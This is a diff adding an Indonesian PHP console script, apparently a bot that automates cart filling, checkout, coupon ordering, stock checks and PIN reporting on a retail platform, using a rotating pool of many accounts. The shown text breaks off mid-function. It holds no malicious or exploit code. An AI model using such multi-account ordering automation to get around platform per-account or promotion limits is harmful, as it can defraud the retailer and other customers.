@@ -1,0 +1,3549 @@
+<?php
+//error_reporting(0);
+copyKlikToZero();
+hapusGakPenting();
+tampilkanMenu();
+
+class Warna {
+  const RESET = "\033[0m";
+  const HIJAU = "\033[32m";
+  const MERAH = "\033[31m";
+  const KUNING = "\033[33m";
+  const BIRU = "\033[34m";
+  const MAGENTA = "\033[35m";
+  const CYAN = "\033[36m";
+  const PUTIH = "\033[37m";
+  const BOLD_HIJAU = "\033[1;32m";
+  const BOLD_MERAH = "\033[1;31m";
+  const BOLD_KUNING = "\033[1;33m";
+  const BOLD_BIRU = "\033[1;34m";
+  const BOLD_MAGENTA = "\033[1;35m";
+  const BOLD_CYAN = "\033[1;36m";
+  const BOLD_PUTIH = "\033[1;37m";
+  const BG_HIJAU = "\033[42m";
+  const BG_MERAH = "\033[41m";
+  const BG_KUNING = "\033[43m";
+  const BG_BIRU = "\033[44m";
+}
+
+/*===========================================
+                 MENU UTAMA
+===========================================*/
+function tampilkanMenu() {
+  while (true) {
+    
+    echo "\n" . Warna::BOLD_CYAN . "╔═══════════════════════════════════════╗" . Warna::RESET . "\n";
+    echo Warna::BOLD_CYAN . "║" . Warna::BOLD_KUNING . "           AUTO JASDER AREA            " . Warna::BOLD_CYAN . "║" . Warna::RESET . "\n";
+    echo Warna::BOLD_CYAN . "╚═══════════════════════════════════════╝" . Warna::RESET . "\n";
+    echo Warna::BOLD_KUNING . "   [1] " . Warna::PUTIH . "Kirim Data Pembayaran via WA\n";
+    echo Warna::BOLD_KUNING . "   [2] " . Warna::PUTIH . "Kirim Data PIN via WA\n";
+    echo Warna::BOLD_KUNING . "   [3] " . Warna::PUTIH . "Auto Isi   Keranjang\n";
+    echo Warna::BOLD_KUNING . "   [4] " . Warna::PUTIH . "Auto Hapus Keranjang\n";
+    echo Warna::BOLD_KUNING . "   [5] " . Warna::PUTIH . "Auto Checkout Payment Point\n";
+    echo Warna::BOLD_KUNING . "   [6] " . Warna::PUTIH . "Auto Checkout Virtual BCA\n";
+    echo Warna::BOLD_KUNING . "   [7] " . Warna::PUTIH . "Auto Cekpin toko jasdor\n";
+    echo Warna::BOLD_KUNING . "   [8] " . Warna::PUTIH . "Rekap PIN\n";
+    echo Warna::BOLD_KUNING . "   [9] " . Warna::PUTIH . "Create Manual Order \n";
+    echo Warna::BOLD_KUNING . "   [10] " . Warna::PUTIH . "Auto Cekstock\n";
+    echo Warna::BOLD_KUNING . "   [11] " . Warna::PUTIH . "Create Order Dari Cek Stock\n";
+    echo Warna::BOLD_KUNING . "   [12] " . Warna::PUTIH . "Auto Cancel\n";
+    echo Warna::BOLD_KUNING . "   [13] " . Warna::PUTIH . "Auto Cek Payment\n";
+    echo Warna::BOLD_KUNING . "   [14] " . Warna::PUTIH . "Auto Co Kupon\n";
+    echo Warna::BOLD_MAGENTA . "   [r] " . Warna::KUNING . "Run SC\n";
+    echo Warna::BOLD_MAGENTA . "   [a] " . Warna::KUNING . "Reset Akun Baru\n";
+    echo Warna::BOLD_MAGENTA . "   [c] " . Warna::KUNING . "Bersihkan Sampah \033[96;1m( ".sampah()." Gb )\n";
+    echo Warna::BOLD_MAGENTA . "   [x] " . Warna::KUNING . "Keluar\n";
+    echo tampilkanAkun();
+    echo "\033[96;1m ".getcwd()." : ";
+    $pilihan = readline(Warna::BOLD_KUNING . "\n› Pilih menu [0-12]: " . Warna::RESET);
+
+    switch ($pilihan) {
+      case '1': kirimDataPembayaran(); break;
+      case '2': kirimDataPin(); break;
+      case '3': autoIsiKeranjang(); break;
+      case '4': autohapus(); break;
+      case '5': autoCheckout("PP", 8); break;
+      case '6': autoCheckout("BCA", 3); break;
+      case '7': autoCekpin(); break;
+      case '8': rekappin(); break;
+      case '9': manualorder(); break;
+      case '10': autocekstock(); break;
+      case '11': hapusstoknol(); break;
+      case '12': autoCancel(); break;
+      case '13': autoCekPayment(); break;
+      case '14': autoCoKupon(); break;
+      case 'r': jalankanGasJasder(); break;
+      case 'a': adjustindex(); break;
+      case 'c': cleanup(); break;
+      
+      case 'x':
+        file_put_contents("stop.txt", "");
+        echo Warna::BOLD_HIJAU . "\n✓ Terima kasih! Program selesai.\n" . Warna::RESET;
+        exit(0);
+      default:
+        echo Warna::BOLD_MERAH . "\n✗ Pilihan tidak valid!\n" . Warna::RESET;
+    }
+  }
+}
+
+/*===========================================
+                 HELPER FUNCTIONS
+===========================================*/
+function autoCekKodeToko($textfile = "input.txt") {
+  $BOLD = "\033[1m";
+  $CYAN = "\033[1;36m";
+  $YELLOW = "\033[1;33m";
+  $GREEN = "\033[1;32m";
+  $RED = "\033[1;31m";
+  $BLUE = "\033[1;34m";
+  $MAGENTA = "\033[1;35m";
+  $RESET = "\033[0m";
+
+  echo $CYAN . "\n===================================\n";
+  echo "     CEK KODE TOKO\n";
+  echo "===================================\n" . $RESET;
+
+  $tampilkanInfo = function($text, $sumber) use ($CYAN, $YELLOW, $GREEN, $RESET, $BOLD) {
+    if (preg_match('/Kode\s*Toko\s*:\s*([A-Z0-9]+)/i', $text, $match)) {
+      $kode = strtoupper(trim($match[1]));
+
+      echo $CYAN . "\n-----------------------------------\n" . $RESET;
+      echo $BOLD . "Kode ditemukan dari: " . $YELLOW . $sumber . $RESET . "\n";
+      echo $BOLD . "Kode Toko : " . $CYAN . $kode . $RESET;
+
+      if (preg_match('/Nama Toko\s*:\s*(.+)/i', $text, $matches)) {
+        $namaToko = trim($matches[1]);
+        echo "\n" . $BOLD . "Nama Toko : " . $YELLOW . $namaToko . $RESET;
+      }
+
+      echo $CYAN . "\n-----------------------------------\n" . $RESET;
+      echo $BOLD . "Pakai kode ini? (y/n) : " . $RESET;
+      return $kode;
+    }
+    return null;
+  };
+
+  echo $BOLD . "Kode Toko (Enter untuk Auto) :\n" . $RESET;
+  echo $CYAN . ">>> " . $RESET;
+  $kodeManual = strtoupper(trim(fgets(STDIN)));
+
+  if (!empty($kodeManual)) {
+    echo $GREEN . "✓ Menggunakan kode manual: " . $CYAN . $kodeManual . $RESET . "\n";
+    return $kodeManual;
+  }
+
+  if (file_exists($textfile)) {
+    echo $BLUE . "\nMengecek file '$textfile'...\n" . $RESET;
+    $text = file_get_contents($textfile);
+    if ($kode = $tampilkanInfo($text, "File")) {
+      $jawaban = trim(strtolower(fgets(STDIN)));
+      if ($jawaban == 'y' || $jawaban == 'yes') {
+        echo $GREEN . "✓ Menggunakan kode dari file\n" . $RESET;
+        return $kode;
+      }
+    } else {
+      echo $RED . "✗ Kode toko tidak ditemukan dalam file\n" . $RESET;
+    }
+  }
+
+  echo $YELLOW . "\nCopy-paste data dari WhatsApp :\n" . $RESET;
+  echo $BOLD . ">>> " . $RESET;
+  $text = "";
+  while (true) {
+    $line = fgets(STDIN);
+    if (trim($line) === ">") break;
+    $text .= $line;
+  }
+
+  if ($kode = $tampilkanInfo($text, "WhatsApp")) {
+    $jawaban = trim(strtolower(fgets(STDIN)));
+    if ($jawaban == 'y' || $jawaban == 'yes') {
+      echo $GREEN . "✓ Menggunakan kode dari WhatsApp\n" . $RESET;
+      return $kode;
+    }
+  }
+
+  echo $RED . "\n===================================\n";
+  echo "   KODE TOKO TIDAK DITEMUKAN\n";
+  echo "===================================\n" . $RESET;
+  echo $YELLOW . "Silakan coba lagi\n" . $RESET;
+
+  return null;
+}
+
+function createFileToko($kodetoko, $jumlahAkun) {
+  $sumber = "klik.txt";
+  $logIndex = "last";
+  $kodeToko = strtoupper($kodetoko);
+
+  if (strlen($kodeToko) !== 4) {
+    echo Warna::BOLD_MERAH . "✗ Kode toko harus 4 karakter!\n" . Warna::RESET;
+    return false;
+  }
+
+  if (!is_numeric($jumlahAkun) || (int)$jumlahAkun <= 0) {
+    echo Warna::BOLD_MERAH . "✗ Jumlah akun harus angka > 0!\n" . Warna::RESET;
+    return false;
+  }
+
+  $jumlah = (int)$jumlahAkun;
+
+  if (!file_exists($sumber)) {
+    echo Warna::BOLD_MERAH . "✗ File klik.txt tidak ditemukan!\n" . Warna::RESET;
+    return false;
+  }
+
+  $start = 0;
+  if (file_exists($logIndex)) {
+    $start = (int) trim(file_get_contents($logIndex));
+  }
+
+  $baris = file($sumber, FILE_IGNORE_NEW_LINES);
+  $total = count($baris);
+
+  if ($start >= $total) {
+    echo Warna::BOLD_MERAH . "✗ Semua baris klik.txt sudah terpakai!\n" . Warna::RESET;
+    echo Warna::BOLD_MERAH . "✗ Silahkan Regis Lagi !! " . Warna::RESET;
+    return false;
+  }
+
+  $end = min($start + $jumlah, $total);
+  $ambil = array_slice($baris, $start, $jumlah);
+  $outputFile = $kodeToko;
+  file_put_contents($outputFile, implode("\n", $ambil) . "\n");
+  file_put_contents($logIndex, $end);
+
+  echo Warna::BOLD_HIJAU . "\n✓ SUKSES CREATE AKUN\n";
+  echo Warna::HIJAU . "  Index    : $start - " . ($end - 1) . "\n";
+  echo "  Total    : " . count($ambil) . " akun\n";
+  echo "  File     : $outputFile\n";
+  echo "  Last idx : $end\n" . Warna::RESET;
+  return true;
+}
+
+function tampilkanAkun() {
+  $src = "klik.txt";
+  $dest = "0";
+  $idxFile = "last";
+
+  if (!file_exists($src)) {
+    file_put_contents($src, "");
+  }
+
+  $index = 0;
+  if (file_exists($idxFile)) {
+    $val = trim(file_get_contents($idxFile));
+    if (is_numeric($val)) {
+      $index = (int)$val;
+    }
+  }
+
+  $lines = [];
+  $existing = [];
+
+  if (file_exists($dest)) {
+    $lines0 = file($dest, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    foreach ($lines0 as $l) {
+      $l = trim($l);
+      if ($l !== "" && !isset($existing[$l])) {
+        $lines[] = $l;
+        $existing[$l] = true;
+      }
+    }
+  }
+
+  $jumlah = 0;
+  if (file_exists($src)) {
+    $linesSrc = file($src, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $jumlah = count($linesSrc);
+
+    foreach ($linesSrc as $l) {
+      $l = trim($l);
+      if ($l !== "" && !isset($existing[$l])) {
+        $lines[] = $l;
+        $existing[$l] = true;
+      }
+    }
+  }
+
+  $total = count($lines);
+
+  if ($jumlah > 0) {
+    $newData = [];
+    foreach ($linesSrc as $l) {
+      $l = trim($l);
+      if ($l !== "" && !isset($existing[$l])) {
+        $newData[] = $l;
+      }
+    }
+
+    if (!empty($newData)) {
+      file_put_contents($dest, "\n" . implode("\n", $newData), FILE_APPEND);
+      file_put_contents($src, "");
+    }
+  }
+
+
+
+  $hasil = Warna::BOLD_HIJAU . " ┌──────────────────────────────────────┐\n";
+  $hasil .= " │ " . Warna::BOLD_CYAN . " 📊 STATISTIK :             " . Warna::BOLD_HIJAU . "         │\n";
+  $hasil .= " ├──────────────────────────────────────┤\n";
+  $hasil .= " │ " . Warna::KUNING . " 👶 Akun Terpakai" . Warna::PUTIH . "    : " . Warna::BOLD_HIJAU . str_pad($index, 5) . Warna::KUNING . " Akun ". Warna::BOLD_HIJAU ."   │\n";
+  $hasil .= " │ " . Warna::KUNING . " 👤 Akun  Baru" . Warna::PUTIH . "       : " . Warna::BOLD_HIJAU . str_pad($jumlah, 5) . Warna::KUNING . " Akun ". Warna::BOLD_HIJAU ."   │\n";
+  $hasil .= " │ " . Warna::KUNING . " 👥 Semua Akun" . Warna::PUTIH . "       : " . Warna::BOLD_HIJAU . str_pad($total, 5) . Warna::KUNING . " Akun ". Warna::BOLD_HIJAU ."   │\n";
+  $hasil .= " │ " . Warna::KUNING . " 🛒 Jumlah Toko" . Warna::PUTIH . "      : " . Warna::BOLD_HIJAU . str_pad(jumlahtoko(), 5) . Warna::KUNING . " Toko ". Warna::BOLD_HIJAU ."   │\n";
+  $hasil .= " └──────────────────────────────────────┘\n" . Warna::RESET;
+
+
+  return $hasil;
+}
+
+function jumlahtoko()
+{
+    $filePath = 'check_pin.txt';
+    $tokoCodes = [];
+
+    // ===== AMBIL KODE TOKO DARI check_pin.txt =====
+    if (file_exists($filePath)) {
+        $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+        foreach ($lines as $line) {
+            $pos = strpos($line, "KODE TOKO: ");
+            if ($pos === false) continue;
+
+            $pos += 11;
+
+            $end1 = strpos($line, " PRODUK:", $pos);
+            $end2 = strpos($line, "(", $pos);
+            $end  = ($end2 !== false) ? $end2 : $end1;
+
+            $kode = ($end === false)
+                ? trim(substr($line, $pos))
+                : trim(substr($line, $pos, $end - $pos));
+
+            if ($kode !== '') {
+                $tokoCodes[$kode] = true;
+            }
+        }
+    }
+
+    // ===== SCAN FILE TANPA EXTENSION (F / T) =====
+    foreach (scandir('.') as $file) {
+        if ($file === '.' || $file === '..') continue;
+        if (is_dir($file)) continue;
+
+        // tidak punya extension
+        if (pathinfo($file, PATHINFO_EXTENSION) !== '') continue;
+
+        // awalan F atau T
+        if (!preg_match('/^[FT]/i', $file)) continue;
+
+        // JIKA SUDAH ADA SEBAGAI KODE TOKO → SKIP
+        if (isset($tokoCodes[$file])) continue;
+
+        $tokoCodes[$file] = true;
+    }
+
+    return count($tokoCodes);
+}
+
+
+function adjustindex() {
+  hapusFileFTTanpaExt();
+  $file0 = "0";
+  $lastFile = "last";
+  $klikFile = "klik.txt";
+  $backupFile = "klik.backup";
+
+
+  if (file_exists($lastFile)) {
+    unlink($lastFile);
+  }
+
+
+  if (file_exists($klikFile)) {
+    unlink($klikFile);
+  }
+
+
+  if (!file_exists($file0)) {
+    return Warna::BOLD_MERAH . "✗ File 0 tidak ditemukan! Proses dibatalkan.\n" . Warna::RESET;
+  }
+
+
+  if (file_exists($file0)) {
+    copy($file0, $backupFile);
+    echo "✓ Backup berhasil! File 0 disalin ke klik.backup\n";
+  }
+
+
+  $lines = file($file0, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+  $uniqueLines = [];
+  $cleanedLines = [];
+
+  foreach ($lines as $line) {
+    $trimmedLine = trim($line);
+    if ($trimmedLine !== "") {
+      // Cek apakah baris sudah ada (case-sensitive)
+      if (!in_array($trimmedLine, $uniqueLines)) {
+        $uniqueLines[] = $trimmedLine;
+        $cleanedLines[] = $trimmedLine;
+      }
+    }
+  }
+
+
+  file_put_contents($file0, implode("\n", $cleanedLines) . "\n");
+
+  $totalUnique = count($cleanedLines);
+  $duplicatesRemoved = count($lines) - $totalUnique;
+
+
+  file_put_contents($lastFile, "1");
+
+
+  file_put_contents($klikFile, "");
+
+  echo "✓ Index diperbarui! Index Terakhir   : 0\n";
+  echo "✓ Index diperbarui! Total Akun Baru  : 0\n";
+  echo "✓ Index diperbarui! Total Semua Akun : $totalUnique\n";
+   
+  if ($duplicatesRemoved > 0) {
+    echo "✓ Duplikat dihapus : $duplicatesRemoved baris duplikat telah dihapus dari file 0\n";
+  } else {
+    echo "✓ Tidak ada duplikat ditemukan di file 0\n";
+  }
+}
+
+
+function hapusFileFTTanpaExt($dir = __DIR__)
+{
+    if (!is_dir($dir)) {
+        return;
+    }
+
+    $files = scandir($dir);
+
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..') continue;
+
+        $path = $dir . DIRECTORY_SEPARATOR . $file;
+
+        if (!is_file($path)) continue;
+
+        // tanpa extension
+        if (pathinfo($file, PATHINFO_EXTENSION) !== '') continue;
+
+        // diawali F atau T
+        if (!preg_match('/^[FT]/', $file)) continue;
+
+        unlink($path);
+    }
+}
+
+
+function getTanggalOtomatis() {
+  date_default_timezone_set('Asia/Jakarta');
+  $jamSekarang = (int)date('H');
+  $tanggalSekarang = (int)date('d');
+
+  if ($jamSekarang >= 18) {
+    $tanggalBesok = $tanggalSekarang + 1;
+    $jumlahHariBulanIni = (int)date('t');
+    if ($tanggalBesok > $jumlahHariBulanIni) {
+      return '01';
+    }
+    return str_pad($tanggalBesok, 2, '0', STR_PAD_LEFT);
+  }
+
+  return str_pad($tanggalSekarang, 2, '0', STR_PAD_LEFT);
+}
+
+function getBulanOtomatis() {
+  date_default_timezone_set('Asia/Jakarta');
+  $jamSekarang = (int)date('H');
+  $bulanSekarang = (int)date('m');
+  $tanggalSekarang = (int)date('d');
+
+  if ($jamSekarang >= 19) {
+    $tanggalBesok = $tanggalSekarang + 1;
+    $jumlahHariBulanIni = (int)date('t');
+
+    if ($tanggalBesok > $jumlahHariBulanIni) {
+      $bulanBesok = $bulanSekarang + 1;
+      if ($bulanBesok > 12) {
+        $bulanBesok = 1;
+      }
+      return str_pad($bulanBesok, 2, '0', STR_PAD_LEFT);
+    }
+  }
+
+  return str_pad($bulanSekarang, 2, '0', STR_PAD_LEFT);
+}
+
+function getShiftOtomatis() {
+  date_default_timezone_set('Asia/Jakarta');
+  $jamSekarang = (int)date('H');
+  $jamMenitSekarang = date('H:i');
+
+  if ($jamSekarang >= 18) {
+    return [
+      'kode' => '2',
+      'info' => "1 Besok Pagi",
+      'waktu' => "Menggunakan tanggal BESOK - Shift 2",
+      'is_besok' => true
+    ];
+  }
+
+  if ($jamSekarang < 13) {
+    return [
+      'kode' => '9',
+      'info' => "1 Hari ini- sebelum jam 13:00",
+      'waktu' => "Menggunakan tanggal HARI INI - Shift 1 (sebelum 13:00)",
+      'is_besok' => false
+    ];
+  }
+
+  return [
+    'kode' => '14',
+    'info' => "2 Hari ini - setelah jam 13:00",
+    'waktu' => "Menggunakan tanggal HARI INI - Shift 1 (setelah 13:00)",
+    'is_besok' => false
+  ];
+}
+
+
+
+function formatDenganBacktic($text) {
+  return "```\n" . $text . "\n```";
+}
+
+function processLine($line, &$uniqueLines, &$totalLines, &$duplicateLines) {
+  $trimmedLine = trim($line);
+  if (empty($trimmedLine)) {
+    return;
+  }
+
+  $totalLines++;
+  if (!in_array($trimmedLine, $uniqueLines)) {
+    $uniqueLines[] = $trimmedLine;
+  } else {
+    $duplicateLines++;
+  }
+}
+
+/*===========================================
+               MENU FUNCTIONS
+===========================================*/
+function autoShift() {
+  date_default_timezone_set('Asia/Jakarta');
+  $jamSekarang = (int)date('H');
+
+  if ($jamSekarang >= 18) {
+    return '2';
+  }
+
+  if ($jamSekarang < 13) {
+    return '9';
+  }
+
+  return '14';
+}
+
+function autoIsiKeranjang() {
+  $CYAN = "\033[1;36m";
+  $YELLOW = "\033[1;33m";
+  $RESET = "\033[0m";
+
+  echo $CYAN . "\n===================================\n";
+  echo "     AUTO ISI KERANJANG\n";
+  echo "===================================\n" . $RESET;
+
+  echo $YELLOW . "Copy-paste data dari text WhatsApp :\n";
+  echo "\033[97;1m>>> ";
+
+  $input = "";
+  while (true) {
+    $line = trim(fgets(STDIN));
+    if ($line === ">") {
+      break;
+    }
+    $input .= $line . "\n";
+  }
+
+  file_put_contents("input.txt", $input);
+
+  echo Warna::BOLD_HIJAU . "\n✓ Data berhasil disimpan ke input.txt\n" . $RESET;
+  echo $CYAN . "\n=== ISI FILE INPUT.TXT ===\n" . $RESET;
+  echo $input . "\n";
+
+  gas();
+}
+
+function gas() {
+  $GREEN = "\033[1;32m";
+  $CYAN = "\033[1;36m";
+  $YELLOW = "\033[1;33m";
+  $RED = "\033[1;31m";
+  $RESET = "\033[0m";
+
+  echo $CYAN . "\n===================================\n";
+  echo "     AUTO ISI KERANJANG\n";
+  echo "===================================\n" . $RESET;
+  echo $YELLOW . "\nLangsung CO ? (y/n): " . $RESET;
+  $langsungco = trim(fgets(STDIN));
+  if ($langsungco == "y") {
+    echo $YELLOW . "\nPayment Toko ? (y/n): " . $RESET;
+    $payementtoko = trim(fgets(STDIN));
+  }
+  $inputFile = "input.txt";
+
+  if (!file_exists($inputFile)) {
+    echo "File input tidak ditemukan!\n";
+    sleep(2);
+    die();
+  }
+
+  $kodeToko = "";
+  $namaToko = "";
+  $typeOrder = "BEDA";
+  $jumlahAkun = 0;
+  $dataAkun = [];
+  $currentAkun = [];
+  $currentPluNumber = 1;
+  $commonPluData = [];
+
+  $lines = file($inputFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+  foreach ($lines as $line) {
+    $line = trim($line);
+
+    if (preg_match('/Kode Toko\s*:\s*(\S+)/i', $line, $matches)) {
+      $kodeToko = trim($matches[1]);
+    } elseif (preg_match('/Nama Toko\s*:\s*(.+)/i', $line, $matches)) {
+      $namaToko = trim($matches[1]);
+    } elseif (preg_match('/Type Order\s*:\s*(\S+)/i', $line, $matches)) {
+      $typeOrder = strtoupper(trim($matches[1]));
+    } elseif (preg_match('/Jumlah akun\s*:\s*(\d+)/i', $line, $matches)) {
+      $jumlahAkun = intval($matches[1]);
+    } elseif ($typeOrder == "BEDA" && preg_match('/Akun ke\s*:\s*(\d+)/i', $line, $matches)) {
+      if (!empty($currentAkun) && isset($currentAkun['akun'])) {
+        $dataAkun[] = $currentAkun;
+      }
+      $currentAkun = ['akun' => $matches[1],
+        'plu' => []];
+      $currentPluNumber = 1;
+    } elseif ($typeOrder == "BEDA" && preg_match('/PLU\s*(\d+)?\s*:?\s*(\d+)/i', $line, $matches)) {
+      if (isset($matches[2])) {
+        $pluValue = $matches[2];
+        $pluNumber = isset($matches[1]) && is_numeric($matches[1]) ? $matches[1] : $currentPluNumber;
+        if (isset($currentAkun['akun'])) {
+          $currentAkun['plu'][$pluNumber]['value'] = $pluValue;
+          $currentPluNumber = $pluNumber + 1;
+        }
+      }
+    } elseif ($typeOrder == "BEDA" && preg_match('/Qty\s*(\d+)?\s*:?\s*(\d+)/i', $line, $matches)) {
+      if (isset($matches[2])) {
+        $qtyValue = $matches[2];
+        $qtyNumber = isset($matches[1]) && is_numeric($matches[1]) ? $matches[1] : $currentPluNumber;
+        if (isset($currentAkun['akun'])) {
+          $currentAkun['plu'][$qtyNumber]['qty'] = $qtyValue;
+        }
+      }
+    } elseif ($typeOrder == "SAMA" && preg_match('/PLU\s*(\d+)?\s*:?\s*(\d+)/i', $line, $matches)) {
+      if (isset($matches[2])) {
+        $pluValue = $matches[2];
+        $pluNumber = isset($matches[1]) && is_numeric($matches[1]) ? $matches[1] : 1;
+        $commonPluData[$pluNumber]['value'] = $pluValue;
+      }
+    } elseif ($typeOrder == "SAMA" && preg_match('/Qty\s*(\d+)?\s*:?\s*(\d+)/i', $line, $matches)) {
+      if (isset($matches[2])) {
+        $qtyValue = $matches[2];
+        $qtyNumber = isset($matches[1]) && is_numeric($matches[1]) ? $matches[1] : 1;
+        $commonPluData[$qtyNumber]['qty'] = $qtyValue;
+      }
+    }
+  }
+
+  if ($typeOrder == "BEDA" && !empty($currentAkun) && isset($currentAkun['akun'])) {
+    $dataAkun[] = $currentAkun;
+  }
+
+  echo $CYAN . "\n=== INFORMASI ORDER ===\n" . $RESET;
+  echo "Type Order: " . ($typeOrder == "SAMA" ? $GREEN : $YELLOW) . $typeOrder . $RESET . "\n";
+  echo "Jumlah Akun: " . ($typeOrder == "SAMA" ? $jumlahAkun : count($dataAkun)) . "\n";
+
+  $namaFile = "";
+
+  if (!empty($kodeToko)) {
+    $namaFile = $kodeToko;
+    echo $GREEN . "Kode Toko: $kodeToko\n" . $RESET;
+    echo $GREEN . "Nama Toko: $namaToko\n" . $RESET;
+  } else {
+    echo $RED . "Kode toko tidak ditemukan!\n" . $RESET;
+    echo $YELLOW . "\nMasukkan nama file target: " . $RESET;
+    $namaFile = trim(fgets(STDIN));
+
+    if (empty($namaFile)) {
+      echo $RED . "Nama file tidak boleh kosong! Proses dibatalkan.\n" . $RESET;
+      sleep(2);
+      return;
+    }
+  }
+
+  if (file_exists($namaFile)) {
+    $file = fopen($namaFile, 'r');
+    $jumlahBaris = 0;
+    while (!feof($file)) {
+      fgets($file);
+      $jumlahBaris++;
+    }
+    fclose($file);
+    $jumlahBaris--;
+
+    echo $GREEN . "\n✓ File '$namaFile' ditemukan! (Jumlah baris: $jumlahBaris)\n" . $RESET;
+
+    echo $YELLOW . "\n=== OPSI FILE ===\n" . $RESET;
+    echo "1. Gunakan file yang ada ($namaFile) dengan $jumlahBaris akun\n";
+    echo "2. Buat Baru ($jumlahAkun akun)\n";
+    echo "3. Batalkan\n";
+
+    echo $YELLOW . "\nPilih opsi (1-3): " . $RESET;
+    $pilihan = trim(fgets(STDIN));
+
+
+    switch ($pilihan) {
+    case '1':
+      echo $GREEN . "✓ Menggunakan file yang ada: $namaFile\n" . $RESET;
+      break;
+    case '2':
+      $konfirmasi = 'y';
+      if ($konfirmasi === 'y' || $konfirmasi === 'yes') {
+        if (!createFileToko($namaFile, $jumlahAkun)) {
+          echo $RED . "Gagal membuat file '$namaFile'! Proses dibatalkan.\n" . $RESET;
+          sleep(2);
+          return;
+        }
+
+        echo $GREEN . "✓ File '$namaFile' berhasil ditimpa!\n" . $RESET;
+
+        $file = fopen($namaFile, 'r');
+        $jumlahBaris = 0;
+        while (!feof($file)) {
+          fgets($file);
+          $jumlahBaris++;
+        }
+        fclose($file);
+        $jumlahBaris--;
+      } else {
+        echo "Proses dibatalkan.\n";
+        sleep(2);
+        return;
+      }
+      break;
+    default:
+      echo "Proses dibatalkan.\n";
+      sleep(2);
+      return;
+    }
+  } else {
+    echo $YELLOW . "\n✗ File '$namaFile' tidak ditemukan!\n" . $RESET;
+
+    if (!empty($kodeToko) && $jumlahAkun > 0) {
+      echo $YELLOW . "Membuat file '$namaFile' dengan $jumlahAkun akun...\n" . $RESET;
+
+      if (!createFileToko($namaFile, $jumlahAkun)) {
+        echo $RED . "Gagal membuat file '$namaFile'! Proses dibatalkan.\n" . $RESET;
+        sleep(2);
+        return;
+      }
+
+      echo $GREEN . "✓ File '$namaFile' berhasil dibuat!\n" . $RESET;
+
+      $file = fopen($namaFile, 'r');
+      $jumlahBaris = 0;
+      while (!feof($file)) {
+        fgets($file);
+        $jumlahBaris++;
+      }
+      fclose($file);
+      $jumlahBaris--;
+    } else {
+      echo $RED . "Tidak dapat membuat file karena kode toko atau jumlah akun tidak valid!\n" . $RESET;
+      sleep(2);
+      return;
+    }
+  }
+
+  echo $GREEN . "\n=== FILE FINAL ===\n" . $RESET;
+  echo "File target: $namaFile\n";
+  echo "Jumlah akun: $jumlahBaris\n";
+
+  $konfirmasi = 'y';
+  if ($konfirmasi !== 'y' && $konfirmasi !== 'yes') {
+    echo "Proses dibatalkan.\n";
+    sleep(2);
+    return;
+  }
+
+  if ($typeOrder == "SAMA") {
+    echo $GREEN . "\n=== PROSES TYPE ORDER: SAMA ===\n" . $RESET;
+
+    if (empty($commonPluData)) {
+      echo $RED . "Tidak ada data PLU untuk type SAMA!\n" . $RESET;
+      sleep(2);
+      return;
+    }
+
+    echo "Data PLU yang akan diproses:\n";
+    ksort($commonPluData);
+    foreach ($commonPluData as $num => $data) {
+      echo "  PLU $num: " . (isset($data['value']) ? $data['value'] : 'N/A') .
+      " - Qty: " . (isset($data['qty']) ? $data['qty'] : '1') . "\n";
+    }
+
+    echo $GREEN . "\nMenjalankan proses untuk semua akun dengan PLU yang sama...\n" . $RESET;
+    echo "Tekan Ctrl+C atau ketik 'quit' untuk membatalkan\n\n";
+    sleep(2);
+
+    $sequence = [];
+    $pluCount = count($commonPluData);
+    $pluIndex = 1;
+
+    ksort($commonPluData);
+    foreach ($commonPluData as $num => $data) {
+      $pluValue = isset($data['value']) ? $data['value'] : '';
+      $qtyValue = isset($data['qty']) ? $data['qty'] : '1';
+
+      if ($pluIndex === 1) {
+        $sequence = array_merge($sequence, [
+          '3',
+          '1',
+          $namaFile,
+          $namaFile,
+          '1',
+          (string)$jumlahBaris,
+          $pluValue,
+          '1',
+          $qtyValue
+        ]);
+      } else {
+        $sequence = array_merge($sequence, [
+          $pluValue,
+          '1',
+          $qtyValue
+        ]);
+      }
+
+
+      if ($pluIndex < $pluCount) {
+        $sequence[] = 'y';
+      } else {
+        $sequence[] = 'n';
+        $sequence[] = 'n';
+        $sequence[] = ' ';
+        if ($langsungco == "y") {
+          $sequence[] = '4';
+          $sequence[] = '1';
+          $sequence[] = '1';
+          $sequence[] = $namaFile;
+          $sequence[] = 'n';
+          $sequence[] = 'n';
+          $sequence[] = 'n';
+          $sequence[] = $namaFile;
+          $sequence[] = getTanggalOtomatis();
+          $sequence[] = getBulanOtomatis();
+          $sequence[] = autoShift();
+          $sequence[] = 'n';
+
+          if ($payementtoko == "y") {
+            $sequence[] = '8';
+          } else {
+            $sequence[] = '3';
+          }
+
+          $sequence[] = '1';
+          $sequence[] = (string)$jumlahBaris;
+          $sequence[] = 'n';
+          $sequence[] = '';
+          $sequence[] = '';
+        }
+        $sequence[] = '';
+        $sequence[] = '';
+      }
+
+      $pluIndex++;
+    }
+
+    jalankanKlik($sequence);
+  } else {
+    echo $GREEN . "\n=== PROSES TYPE ORDER: BEDA ===\n" . $RESET;
+
+    if (empty($dataAkun)) {
+      echo $RED . "Tidak ada data akun yang ditemukan!\n" . $RESET;
+      sleep(2);
+      return;
+    }
+
+    echo $GREEN . "\nDitemukan " . count($dataAkun) . " akun:\n" . $RESET;
+    foreach ($dataAkun as $index => $akun) {
+      echo "Akun " . ($index + 1) . ": #" . $akun['akun'] . "\n";
+      if (!empty($akun['plu'])) {
+        ksort($akun['plu']);
+        foreach ($akun['plu'] as $pluNum => $pluData) {
+          echo "  PLU $pluNum: " . (isset($pluData['value']) ? $pluData['value'] : 'TIDAK ADA') .
+          " - Qty: " . (isset($pluData['qty']) ? $pluData['qty'] : 'TIDAK ADA') . "\n";
+        }
+      }
+    }
+
+    echo $GREEN . "\nMenjalankan proses auto isi keranjang...\n" . $RESET;
+    echo "Tekan Ctrl+C atau ketik 'quit' untuk membatalkan\n\n";
+    sleep(2);
+
+    $sequence = [];
+
+    foreach ($dataAkun as $index => $akun) {
+      ksort($akun['plu']);
+
+      $pluCount = count($akun['plu']);
+      $pluIndex = 1;
+
+      foreach ($akun['plu'] as $pluNum => $pluData) {
+        if ($index === 0 && $pluIndex === 1) {
+          $sequence = array_merge($sequence, [
+            '3',
